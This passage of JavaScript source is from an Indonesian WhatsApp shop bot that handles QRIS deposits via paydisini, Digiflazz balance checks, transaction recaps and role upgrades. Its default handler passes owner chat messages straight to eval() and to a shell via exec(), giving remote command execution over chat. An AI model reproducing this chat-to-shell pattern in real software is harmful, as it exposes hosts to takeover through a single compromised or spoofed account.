    fs.writeFileSync(trxFilePath, JSON.stringify(trxUserData, null, 2), 'utf8');    
reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${response.data.data.status} )\n══════════════════════\n_ID: ${tanggal + jam}_\n_Layanan :_ ${namaproduk}\n_Data :_ ${tujuan}\n_Harga :_ ${formatmoney(harga_produk)}\n_Invoice :_ ${response.data.data.sn}`)
break;
              }
            }
          })
          .catch(error => {
            if (error.response) {   
               sett("+saldo", m.sender, hrga)           
 reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${error.response.data.data.status} )\n══════════════════════\n_Tujuan :_ ${nomor}\n_Layanan :_ ${namaproduk}\n_Harga :_ ${formatmoney(harga_produk)}\n_Mess :_ ${error.response.data.data.message}`) 
kris.sendMessage(nomorKu, {text:`*Transaksi Gagal Produk:* ${namaproduk}\n${error.response.data.data.message}`})                 
            }
   });
sett("layanan", m.sender, "")
sett("harga", m.sender, 0)
sett("tujuan", m.sender, "")  
sett("desc", m.sender, "")  
sett("reff", m.sender, "") 
sett("kode_produk", m.sender, "")  
sett("status", m.sender, true)
     
 
}
break      
*/
    case 'depoqris':{
    const nominl = text.split("|")[0]
    const nominal = Number(nominl);
    if(!nominal) return reply('Contoh #depoqris nominal')
    const moment = require("moment");
    const fs = require("fs");
    const path = require("path");
    const md5 = require("md5");
    // Menggunakan FormData dari form-data

    let now = moment();
    let newTime = now.add(30, "minutes");
    let formattedTime = newTime.format("YYYY-MM-DD HH:mm:ss");
    let trx_id = require("crypto").randomBytes(5).toString("hex").toUpperCase();
    // Setup form dan API request
    const url = "https://paydisini.co.id/api/";
    const apikey = global.paydisini.apikey;
    const validt = global.paydisini.validt;
    const serv = global.paydisini.service;
    const type = global.paydisini.type;

    // Membuat signature untuk permintaan API
    const signature = md5(
        apikey + trx_id + serv + nominal + validt + "NewTransaction",
    );

    // Menggunakan FormData untuk mengirimkan data request
    const data = new FormData();
    data.append("key", apikey);
    data.append("request", "new");
    data.append("unique_code", trx_id);
    data.append("service", serv);
    data.append("amount", nominal);
    data.append("note", trx_id);
    data.append("valid_time", validt);
    data.append("type_fee", type);
    data.append("signature", signature);

    // Melakukan request ke API dengan axios
    try {
        const response = await axios.post(url, data, {
            headers: {
                ...data.getHeaders(), // Mengambil header dari FormData
            },
        });

        const responseData = response.data;

        if (responseData.success) {
            const data = responseData.data;
            let teks =
                `🛍️ Payment Invoice\n\n` +
                `${data.unique_code}\n\n` +
                `Details Payment:\n` +
                `- Amount Deposit: ${nominal}\n` +
                `- Payment Method: Qris\n` +
                `- Note: Deposit ${namabot}\n` +
                `- Valid Time: 30 Minutes\n\n` +
                `⚠️ Lakukan Pembayaran Sebelum \n${formattedTime} Sejumlah ${formatmoney(data.amount)}\n` +
                `Tekan Button Cek Payment Jika Deposit mengalami Bug\n\n` +
                `Harap Lakukan Pembayaran Dalam Waktu yang sudah ditentukan!\n` +
                `Balance Kamu Akan Bertambah Otomatis Jika kamu sudah melakukan pembayaran\n\n` +
                `Cara Melakukan Pembayaran\n` +
                `1. Buka Aplikasi Ewalletmu (Gopay / Dana)\n` +
                `2. Pastikan Saldo Cukup\n` +
                `3. Pilih Opsi QRIS\n` +
                `4. Scan QR Code yang ada di atas\n` +
                `5. Lalu Bayar`;
            let gambr = { url: data.qrcode_url };
        let bah = await kris.sendMessage(m.chat, {image: gambr, caption: teks})    
            
            checkPaymentStatus(bah, trx_id, nominal);             
        } else {
           reply(`Error: ${responseData.msg}`);
        }
    } catch (error) {
        console.error("Terjadi kesalahan:", error);
        reply(
            "Terjadi kesalahan saat memproses transaksi, silakan coba lagi nanti.",
        );
    }
    }
    break
        case 'ceksaldo':
case 'saldo':{
    const filePath = './Pengaturan/database/datatrx.json';
    const targetUser = m.sender // Nomor pengguna yang ingin diperiksa

    try {
        // Read the JSON file
        const fileData = fs.readFileSync(filePath, 'utf8');
        const allTransactions = JSON.parse(fileData);

        if (allTransactions.length === 0) {
            return reply("Tidak Ditemukan Data Transaksi");
        }

        // Filter transaksi berdasarkan nomor pengguna target
        const userTransactions = allTransactions.filter(data => data.buyer.includes(targetUser));

        // Menghitung total transaksi dan total belanja untuk pengguna target
        let totalTransaksi = 0;
        let totalBelanja = 0;

        userTransactions.forEach(data => {
            totalTransaksi += parseFloat(data.harga);
            totalBelanja += 1; // Setiap transaksi menambah 1 ke total belanja
        });

        // Membuat pesan balasan dengan detail akun, saldo, total transaksi, dan total belanja untuk pengguna target
        let myde = `*──「 DETAIL AKUN 」───* 

*○*  *Name :* ${pushname}
*○*  *Id :* ${sender.replace("@s.whatsapp.net", "")}
*○*  *Saldo :*  ${formatmoney(cek("saldo", m.sender))}
*○*  *Total Transaksi :*  ${formatmoney(totalTransaksi)}
*○*  *Total Belanja :* ${totalBelanja}

𝘐𝘯𝘨𝘪𝘯 𝘥𝘦𝘱𝘰𝘴𝘪𝘵 𝘴𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘬𝘦𝘵𝘪𝘬 𝘤𝘰𝘮𝘮𝘢𝘯𝘥 *.deposit*`
        
        // Mengirimkan pesan dengan detail akun dan transaksi untuk pengguna target
        reply(myde);
    } catch (error) {
        console.error('Error reading the transaction history file:', error);
        reply("Error, Tidak dapat membaca data");
    }
    }
    break;        
        

     case 'getdigi': {
  if (!isOwner) return reply(mess.owner);

  // Memanggil getPpob dan getPasca
  getPpob(digiuser, digiapi).then((ppobData) => {
    // Path untuk menyimpan data prepaid
    const ppobFilePath = path.join(__dirname, 'Pengaturan', 'database', 'datadigiflaz.json');
    saveDataToFile(ppobFilePath, ppobData);
  }).catch((error) => {
    console.log('Gagal mengambil data prepaid:', error);
  });

  getPasca(digiuser, digiapi).then((pascaData) => {
    // Path untuk menyimpan data pascabayar
    const pascaFilePath = path.join(__dirname, 'Pengaturan', 'database', 'pascabayar.json');
    saveDataToFile(pascaFilePath, pascaData);
  }).catch((error) => {
    console.log('Gagal mengambil data pascabayar:', error);
  });
}
break;




case 'saldodigi': {
if (m.isGroup) return m.reply('Fitur Khusus Private Chat')
if (!isOwner) return m.reply("Fitur khusus owner!")
const crypto = require("crypto")
const axios = require("axios")
let third = 'depo';
let hash = crypto.createHash('md5')
  .update(digiuser + digiapi + third)
  .digest('hex');

var config = {
  method: 'POST',  // Set the HTTP method to POST
  url: 'https://api.digiflazz.com/v1/cek-saldo',  // Set the target URL
  data: {
    "cmd": "deposit",
    "username": digiuser,
    "sign": hash
}
};

axios(config)
  .then(function (response) {
    if (response.data.data){
    m.reply(`*「 CEK SALDO DIGIFLAZ 」*

› STATUS DIGIFLAZZ : *TERHUBUNG*
› SALDO SERVER : *${formatmoney(response.data.data.deposit)}*\n`)
  } else {
  m.reply(`*「 AKUN DIGIFLAZZ 」*\n
*Server Terputus Mohon Untuk Mengecek Providernya Kembali*.\n`)
}
  })
}
break			   
case 'getip': {
  if (!isOwner) return reply(mess.owner) ;
  m.reply("My public IP address is: " + ipserver);
break;
};              
case 'restart': {
  if (!isOwner) {
    return m.reply(mess.owner);
  }
  await m.reply(`_Restarting ${packname}_`);
  try {
    await kris.sendMessage(from, {text: "*_Succes_*"});
    await sleep(3000);
    exec(`npm start`);
  } catch (err) {
    exec(`node index.js`);
    await sleep(4000);
    m.reply('*_Sukses_*');
  }
break;
};
case 'rekapsaldo': {
    const moment = require('moment');
    if (!isOwner) return;
    if (cek("id", m.sender) == null) return reply("Maaf Anda Belum Daftar")

    const filePath = './Pengaturan/database/user.json';

    try {
        const fileData = fs.readFileSync(filePath, 'utf8');
        const allUserData = JSON.parse(fileData);

        if (allUserData.length === 0) {
            return reply("Tidak Ditemukan Data Transaksi");
        }
        const userSaldoSummary = {};
        let totalSaldoSemuaPengguna = 0;
        allUserData.forEach(data => {
            const id = data.id.split('@')[0];
            const saldo = parseFloat(data.saldo);
            if (!userSaldoSummary[id]) {
                userSaldoSummary[id] = {
                    totalSaldo: 0
                };
            }
            userSaldoSummary[id].totalSaldo += saldo;           
            totalSaldoSemuaPengguna += saldo;
        });
        let replyMessage = `*[ REKAP SALDO MEMBER ]*\n\n`;       
        replyMessage += `*TOTAL SALDO SEMUA PENGUNA: Rp ${totalSaldoSemuaPengguna.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,')}\n\n`;
        for (const id in userSaldoSummary) {
            replyMessage += `*ID Pengguna: ${id}*\n`;
            replyMessage += "```" + `Total Saldo: Rp ${userSaldoSummary[id].totalSaldo.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,')}\n` + "```";
            replyMessage += "====================\n\n";
        }

        reply(replyMessage);
    } catch (error) {
        console.error('Error reading the user data file:', error);
        reply("Error, Tidak dapat membaca data");
    }

break; 
     }
     
     
 case 'rekaptrx': {
    if (!isOwner) return;
    
    const filePath = './Pengaturan/database/datatrx.json';

    try {
        const fileData = fs.readFileSync(filePath, 'utf8');
        const allTransactions = JSON.parse(fileData);

        if (allTransactions.length === 0) {
            return reply("Tidak Ditemukan Data Transaksi");
        }

        const monthlyTransactionSummary = {};
        allTransactions.forEach(data => {
            const transactionDate = moment(data.date);
            const transactionMonth = transactionDate.format('MMMM');

            if (!monthlyTransactionSummary[transactionMonth]) {
                monthlyTransactionSummary[transactionMonth] = {
                    totalTransactions: 0,
                    totalHarga: 0,
                    totalHargaModal: 0,
                    totalProfit: 0
                };
            }

            monthlyTransactionSummary[transactionMonth].totalTransactions += 1;
            monthlyTransactionSummary[transactionMonth].totalHarga += parseFloat(data.harga);
            monthlyTransactionSummary[transactionMonth].totalHargaModal += parseFloat(data.harga_modal);

            const profit = parseFloat(data.harga) - parseFloat(data.harga_modal);
            monthlyTransactionSummary[transactionMonth].totalProfit += profit;
        });

        let replyMessage = `*[ REKAP TRANSAKSI BULANAN ]*\n\n`;
        Object.keys(monthlyTransactionSummary).forEach(month => {
            const summary = monthlyTransactionSummary[month];
            const formattedTotalHarga = new Intl.NumberFormat('id-ID', {
                style: 'currency',
                currency: 'IDR'
            }).format(summary.totalHarga);
            const formattedTotalHargaModal = new Intl.NumberFormat('id-ID', {
                style: 'currency',
                currency: 'IDR'
            }).format(summary.totalHargaModal);
            const formattedTotalProfit = new Intl.NumberFormat('id-ID', {
                style: 'currency',
                currency: 'IDR'
            }).format(summary.totalProfit);

            replyMessage += `*Bulan ${month}*\n`;
            replyMessage += `Total Transaksi: ${summary.totalTransactions}\n`;
            replyMessage += `Omset: ${formattedTotalHarga}\n`;
            replyMessage += `Modal: ${formattedTotalHargaModal}\n`;
            replyMessage += `Profit: ${formattedTotalProfit}\n\n`;
        });

        reply(replyMessage);
    } catch (error) {
        console.error('Error reading the transaction history file:', error);
        reply("Error, Tidak dapat membaca data");
    }
    break;
}
case 'listdeposit': {
    const filePath = './Pengaturan/database/datadepo.json';

    
    try {
        const fileData = fs.readFileSync(filePath, 'utf8');
        const allUserData = JSON.parse(fileData);

        const userData = allUserData.filter(data => data.buyer === m.sender);

        if (userData.length === 0) {
            return reply("Kamu belum memiliki riwayat transaksi. Jika ingin melakukan transaksi silahkan ketik .menu");
        }

        let totalHarga = 0;
        let totalTransactions = userData.length;

        userData.forEach(data => {
            totalHarga += parseFloat(data.saldo_diterima);
        });

        const historyText = userData.map((data, index) => {
            const formattedHarga = new Intl.NumberFormat('id-ID', {
                style: 'currency',
                currency: 'IDR'
            }).format(data.harga);

            return `_*#Deposit Ke-${index + 1}:*_
*› Status:* ${data.status}
*› Reff ID:* ${data.ref_id}
*› Waktu:* ${data.date}
*› Total Bayar :* ${formatmoney(data.total_bayar)}
*› Saldo Diterima:* _${formatmoney (data.saldo_diterima)}_\n`;
        });

        const formattedTotalHarga = new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(totalHarga);

        const replyMessage = `*[ RIWAYAT DEPOSIT ]*

*Total DEPOSIT:* ${totalTransactions}
*Jumlah DEPOSIT:* ${formattedTotalHarga}

${historyText.join('\n')}`;

        reply(replyMessage);
    } catch (error) {
        console.error('Error reading the transaction history file:', error);
        reply("Ada Masalah ketika membaca data, silahkan hubungi owner.");
    }
    break;
}
case 'upgrade': {
    const rol = args[0].toUpperCase(); // Mengonversi role menjadi huruf besar
    if (!rol) return reply("Role yang diinginkan tidak ditemukan. Contoh: #upgrade VIP");
const currentRole = cek("role", m.sender).toUpperCase(); // Mendapatkan peran saat ini pengguna


    if (rol === "VIP") {
        if (currentRole === "VIP" && rol === "VIP") return reply("Role Anda sudah VVIP.");
        if (30000 > cek("saldo", m.sender)) return reply(`Maaf, saldo Anda tidak mencukupi untuk upgrade menjadi VIP. Silakan deposit terlebih dahulu.`);
        
        reply("Proses upgrade...");
        sett("-saldo", m.sender, 30000);
        await sleep(1500);
        sett("role", m.sender, "VIP");
        reply(`Selamat, peran Anda sekarang menjadi ${cek("role", m.sender)}`);
    } else if (rol === "VVIP") {
        if (currentRole === "VVIP" && rol === "VVIP") return reply("Role Anda sudah VVIP.");
        if (60000 > cek("saldo", m.sender)) return reply(`Maaf, saldo Anda tidak mencukupi untuk upgrade menjadi VVIP. Silakan deposit terlebih dahulu.`);
        
        reply("Proses upgrade...");
        sett("-saldo", m.sender, 60000);
        sett("role", m.sender, "VVIP");
        await sleep(1500);
        
        reply(`Selamat, peran Anda sekarang menjadi ${cek("role", m.sender)}.`);
    } else {
        reply("Peran yang diminta tidak valid.");
    }
    break;
}
 
default:
if (budy.startsWith('<')) {
if (!isOwner) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('vv')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!isOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
kris.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
kris.sendMessage("6285971817423@s.whatsapp.net", { text: "assalamualaikum Owner Ada Fitur Yang Eror Nih " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update'${__filename}'`))
	delete require.cache[file]
	require(file)
})